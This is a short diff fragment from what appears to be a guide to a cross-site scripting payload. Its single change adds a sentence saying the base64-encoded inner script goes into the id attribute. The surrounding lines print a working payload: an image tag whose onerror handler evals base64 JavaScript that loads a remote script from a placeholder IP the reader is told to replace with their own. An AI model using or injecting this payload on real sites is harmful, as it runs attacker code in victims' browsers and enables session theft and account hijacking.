@@ -18,7 +18,7 @@ Final payload - (don't use this directly, follow the directions below. This is j
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly8xOTIuMTY4LjEuMSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
 ```
 
-Inner payload - modify your IP address then base64 encode this.
+Inner payload - modify your IP address then base64 encode this. The base64 encoded payload will replace the value of the id parameter above.
 ```
 var a=document.createElement("script");a.src="http://192.168.1.1";document.body.appendChild(a);
 ```
